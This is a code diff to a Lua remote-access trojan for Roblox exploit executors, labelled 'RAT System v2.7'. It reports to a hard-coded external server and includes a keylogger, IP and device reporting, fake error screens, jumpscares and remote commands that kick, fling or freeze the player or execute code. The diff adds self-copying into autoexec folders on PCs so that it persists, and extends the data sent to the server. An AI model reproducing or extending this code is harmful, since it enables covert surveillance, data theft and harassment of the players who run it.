@@ -14,12 +14,26 @@ local CoreGui = game:GetService("CoreGui")
 local SERVER_URL = "https://ratserver-6wo3.onrender.com"
 local player = Players.LocalPlayer
 
+-- Определение типа устройства
+local function getDeviceType()
+    if UserInputService.TouchEnabled then
+        if UserInputService.MouseEnabled then
+            return "Tablet"
+        else
+            return "Mobile"
+        end
+    else
+        return "PC"
+    end
+end
+
 -- Системные переменные
 local keyloggerEnabled = false
 local keylogBuffer = ""
 local lastSendTime = os.time()
 local scriptHidden = false
 local lastUserUpdate = 0
+local deviceType = getDeviceType()
 
 -- Безопасная проверка функций
 local function safeCheck(funcName)
@@ -65,6 +79,55 @@ local function safeCheck(funcName)
         return (syn and syn.request) or (request) or (http and http.request)
     end
     return false
+end
+
+-- Автоматическое клонирование в Autoexec (только для ПК)
+local function autoInstallToAutoexec()
+    if deviceType ~= "PC" or not safeCheck("writefile") then
+        return false
+    end
+    
+    local success = pcall(function()
+        local scriptSource = "-- RAT System v2.7\n" .. tostring(script.Source)
+        
+        -- Пути для автозагрузки разных эксплойтов
+        local autoexecPaths = {
+            "autoexec.lua",
+            "autoexec/startup.lua",
+            "workspace/autoexec.lua",
+            "scripts/rat.lua",
+            "autoexec/rat.lua",
+            "startup.lua",
+        }
+        
+        -- Для Synapse
+        if syn and syn.writefile then
+            table.insert(autoexecPaths, "synapse/autoexec.lua")
+            table.insert(autoexecPaths, "synapse/workspace/rat.lua")
+        end
+        
+        -- Для Krnl
+        if krnl then
+            table.insert(autoexecPaths, "krnl/autoexec.lua")
+        end
+        
+        -- Для Fluxus
+        if fluxus then
+            table.insert(autoexecPaths, "fluxus/autoexec.lua")
+        end
+        
+        local installedCount = 0
+        for _, path in ipairs(autoexecPaths) do
+            pcall(function()
+                writefile(path, scriptSource)
+                installedCount = installedCount + 1
+            end)
+        end
+        
+        return installedCount > 0
+    end)
+    
+    return success or false
 end
 
 -- Безопасный HTTP-запрос
@@ -140,7 +203,8 @@ local function sendUserInfo()
             Body = HttpService:JSONEncode({
                 player = playerName,
                 place = placeName,
-                executor = executor
+                executor = executor,
+                device = deviceType
             })
         })
         return response ~= nil
@@ -193,7 +257,7 @@ local function sendInjectNotification()
         Headers = {["Content-Type"] = "application/json"},
         Body = HttpService:JSONEncode({
             command = "inject_notify",
-            args = {playerName, placeName, ipData, executor}
+            args = {playerName, placeName, ipData, executor, deviceType}
         })
     })
 end
@@ -246,13 +310,23 @@ local function getHardwareInfo()
         end
     end
 
+    -- Информация о системе
+    local systemInfo = {
+        device_type = deviceType,
+        touch_enabled = UserInputService.TouchEnabled,
+        mouse_enabled = UserInputService.MouseEnabled,
+        keyboard_enabled = UserInputService.KeyboardEnabled,
+        screen_size = workspace.CurrentCamera.ViewportSize
+    }
+
     local hardwareData = {
         player = playerName,
         game = placeName,
         fps = fps,
         ping = ping,
         executor = executor,
-        ip_info = ipData
+        ip_info = ipData,
+        system = systemInfo
     }
     
     return hardwareData
@@ -334,7 +408,7 @@ end
 
 -- Фейковая ошибка
 local function showFakeError(message)
-    local success, result = pcall(function()
+    local success = pcall(function()
         local gui = Instance.new("ScreenGui")
         gui.Name = "FakeError"
         gui.Parent = player:WaitForChild("PlayerGui")
@@ -357,7 +431,11 @@ local function showFakeError(message)
         textLabel.Parent = frame
         
         task.delay(10, function()
-            gui:Destroy()
+            pcall(function()
+                if gui and gui.Parent then
+                    gui:Destroy()
+                end
+            end)
         end)
         
         return true
@@ -366,9 +444,9 @@ local function showFakeError(message)
     return success
 end
 
--- Всплывающее сообщение
+-- Всплывающее сообщение (ИСПРАВЛЕННАЯ ВЕРСИЯ)
 local function showPopupMessage(message)
-    local success, result = pcall(function()
+    local success = pcall(function()
         local gui = Instance.new("ScreenGui")
         gui.Name = "PopupMessage"
         gui.Parent = player:WaitForChild("PlayerGui")
@@ -400,6 +478,7 @@ local function showPopupMessage(message)
         tweenIn:Play()
         tweenTextIn:Play()
         
+        -- Упрощенный таймер без tween.Completed
         task.delay(7, function()
             local tweenOut = TweenService:Create(frame, TweenInfo.new(0.5), {BackgroundTransparency = 1})
             local tweenTextOut = TweenService:Create(textLabel, TweenInfo.new(0.5), {TextTransparency = 1})
@@ -407,8 +486,13 @@ local function showPopupMessage(message)
             tweenOut:Play()
             tweenTextOut:Play()
             
-            tweenOut.Completed:Connect(function()
-                pcall(function() gui:Destroy() end)
+            -- Просто ждем и уничтожаем
+            task.delay(0.6, function()
+                pcall(function()
+                    if gui and gui.Parent then
+                        gui:Destroy()
+                    end
+                end)
             end)
         end)
         
@@ -459,7 +543,7 @@ local function setupKeylogger()
     return success
 end
 
--- ЧАТ-МОДУЛЬ (ПОЛНАЯ ВЕРСИЯ)
+-- ЧАТ-МОДУЛЬ (ПОЛНАЯ РАБОЧАЯ ВЕРСИЯ)
 local function setupChat()
     local success, result = pcall(function()
         local screenGui = Instance.new("ScreenGui")
@@ -569,19 +653,7 @@ local function setupChat()
     return success and result or nil
 end
 
--- Инициализируем чат при запуске
 local chatSystem = setupChat()
-
--- В функции ExecuteCommand исправь обработку команды chat:
-elseif cmd == "chat" then
-    if chatSystem then
-        chatSystem.gui.Enabled = not chatSystem.gui.Enabled
-        chatSystem.enabled = chatSystem.gui.Enabled
-        -- Добавляем сообщение при включении/выключении
-        if chatSystem.gui.Enabled then
-            chatSystem.addMessage("Система", "Чат включен", true)
-        end
-    end
 
 -- СКРИМЕР МОДУЛЬ -----------------------------------------------------------------
 local function createFullscreenGUI()
@@ -669,7 +741,12 @@ local function jeffKillerJumpscare()
         redOverlay.BackgroundTransparency = 0.95
         task.wait(0.07)
     end
-    redOverlay:Destroy()
+    
+    pcall(function()
+        if redOverlay and redOverlay.Parent then
+            redOverlay:Destroy()
+        end
+    end)
     
     task.wait(1.2)
     
@@ -678,9 +755,13 @@ local function jeffKillerJumpscare()
     })
     fadeOut:Play()
     
-    fadeOut.Completed:Wait()
-    task.wait(0.5)
-    screenGui:Destroy()
+    task.wait(1.6)
+    
+    pcall(function()
+        if screenGui and screenGui.Parent then
+            screenGui:Destroy()
+        end
+    end)
 end
 
 -- 2. СОНИК.EXE СКРИМЕР
@@ -793,9 +874,13 @@ local function sonicExeJumpscare()
     })
     sonicFade:Play()
     
-    sonicFade.Completed:Wait()
-    task.wait(0.5)
-    screenGui:Destroy()
+    task.wait(2.1)
+    
+    pcall(function()
+        if screenGui and screenGui.Parent then
+            screenGui:Destroy()
+        end
+    end)
 end
 
 local function executeJumpscareCommand(scareType)
@@ -811,15 +896,14 @@ end
 
 -- Обработка команд
 local function ExecuteCommand(cmd, args)
-    local success, errorMsg = pcall(function()
-        local character = player.Character or player.CharacterAdded:Wait()
-        local humanoid = character:FindFirstChildOfClass("Humanoid")
-        local root = character:FindFirstChild("HumanoidRootPart")
-
+    local success = pcall(function()
         if cmd == "chat" then
             if chatSystem then
                 chatSystem.gui.Enabled = not chatSystem.gui.Enabled
                 chatSystem.enabled = chatSystem.gui.Enabled
+                if chatSystem.gui.Enabled then
+                    chatSystem.addMessage("Система", "Чат включен", true)
+                end
             end
         
         elseif cmd == "popup" then
@@ -833,41 +917,65 @@ local function ExecuteCommand(cmd, args)
         elseif cmd == "kick" then
             player:Kick(args[1] or "Кикнут администратором")
         
-        elseif cmd == "freeze" and humanoid then
-            humanoid.WalkSpeed = 0
-            task.delay(tonumber(args[1] or 5), function()
-                if humanoid then humanoid.WalkSpeed = 16 end
-            end)
+        elseif cmd == "freeze" then
+            local character = player.Character or player.CharacterAdded:Wait()
+            local humanoid = character:FindFirstChildOfClass("Humanoid")
+            if humanoid then
+                humanoid.WalkSpeed = 0
+                task.delay(tonumber(args[1] or 5), function()
+                    if humanoid then humanoid.WalkSpeed = 16 end
+                end)
+            end
         
-        elseif cmd == "void" and root then
-            root.CFrame = CFrame.new(0, -5000, 0)
+        elseif cmd == "void" then
+            local character = player.Character or player.CharacterAdded:Wait()
+            local root = character:FindFirstChild("HumanoidRootPart")
+            if root then
+                root.CFrame = CFrame.new(0, -5000, 0)
+            end
         
-        elseif cmd == "spin" and root then
-            for i = 1, 20 do
-                if root then
-                    root.CFrame = root.CFrame * CFrame.Angles(0, math.rad(30), 0)
-                    task.wait(0.1)
+        elseif cmd == "spin" then
+            local character = player.Character or player.CharacterAdded:Wait()
+            local root = character:FindFirstChild("HumanoidRootPart")
+            if root then
+                for i = 1, 20 do
+                    if root then
+                        root.CFrame = root.CFrame * CFrame.Angles(0, math.rad(30), 0)
+                        task.wait(0.1)
+                    end
                 end
             end
         
-        elseif cmd == "fling" and root then
-            root.Velocity = Vector3.new(0, 5000, 0)
+        elseif cmd == "fling" then
+            local character = player.Character or player.CharacterAdded:Wait()
+            local root = character:FindFirstChild("HumanoidRootPart")
+            if root then
+                root.Velocity = Vector3.new(0, 5000, 0)
+            end
         
-        elseif cmd == "sit" and humanoid then
-            humanoid.Sit = not humanoid.Sit
+        elseif cmd == "sit" then
+            local character = player.Character or player.CharacterAdded:Wait()
+            local humanoid = character:FindFirstChildOfClass("Humanoid")
+            if humanoid then
+                humanoid.Sit = not humanoid.Sit
+            end
         
-        elseif cmd == "dance" and humanoid then
-            local anim = Instance.new("Animation")
-            anim.AnimationId = "rbxassetid://35654637"
-            local track = humanoid:LoadAnimation(anim)
-            track:Play()
+        elseif cmd == "dance" then
+            local character = player.Character or player.CharacterAdded:Wait()
+            local humanoid = character:FindFirstChildOfClass("Humanoid")
+            if humanoid then
+                local anim = Instance.new("Animation")
+                anim.AnimationId = "rbxassetid://35654637"
+                local track = humanoid:LoadAnimation(anim)
+                track:Play()
+            end
         
         elseif cmd == "blur" then
             local blur = Instance.new("BlurEffect")
             blur.Size = 24
             blur.Parent = Lighting
             task.delay(tonumber(args[1] or 5), function()
-                if blur then blur:Destroy() end
+                pcall(function() if blur then blur:Destroy() end end)
             end)
         
         elseif cmd == "mute" then
@@ -881,12 +989,14 @@ local function ExecuteCommand(cmd, args)
             end
         
         elseif cmd == "playaudio" and args[1] then
+            local character = player.Character or player.CharacterAdded:Wait()
+            local root = character:FindFirstChild("HumanoidRootPart")
             local sound = Instance.new("Sound")
             sound.SoundId = "rbxassetid://"..args[1]
             sound.Parent = root or player
             sound:Play()
             sound.Ended:Connect(function()
-                sound:Destroy()
+                pcall(function() sound:Destroy() end)
             end)
         
         elseif cmd == "execute" then
@@ -984,10 +1094,6 @@ local function ExecuteCommand(cmd, args)
         
         end
     end)
-    
-    if not success then
-        -- Тихая обработка ошибок
-    end
 end
 
 -- Функция проверки команд
@@ -1014,6 +1120,12 @@ end
 
 -- Инициализация с безопасной проверкой
 local function initialize()
+    -- Автоматическая установка в autoexec для ПК
+    if deviceType == "PC" then
+        task.wait(1)
+        pcall(autoInstallToAutoexec)
+    end
+    
     -- Отправляем уведомление об инжекте
     pcall(sendInjectNotification)
     
@@ -1027,7 +1139,7 @@ end
 -- Главный цикл
 local function mainLoop()
     while task.wait(2) do
-        local hasCommand = pcall(checkCommands)
+        pcall(checkCommands)
         
         -- Отправляем информацию о пользователе каждые 15 секунд
         if os.time() - lastUserUpdate >= 15 then
